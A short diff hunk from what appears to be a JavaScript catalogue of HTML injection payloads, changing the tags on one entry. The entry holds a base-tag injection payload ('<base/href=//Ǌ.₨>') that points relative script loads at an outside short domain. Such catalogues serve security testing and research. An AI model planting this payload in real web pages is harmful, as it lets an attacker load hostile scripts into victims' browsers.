@@ -22,7 +22,7 @@ const TAGS = {
 const PAYLOADS = [
     {
         html: '<base/href=//Ǌ.₨>',
-        tags: [TAGS.requiresRelativeScript, TAGS.scripts],
+        tags: [TAGS.requiresRelativeScript],
         author: null,
     },
     {
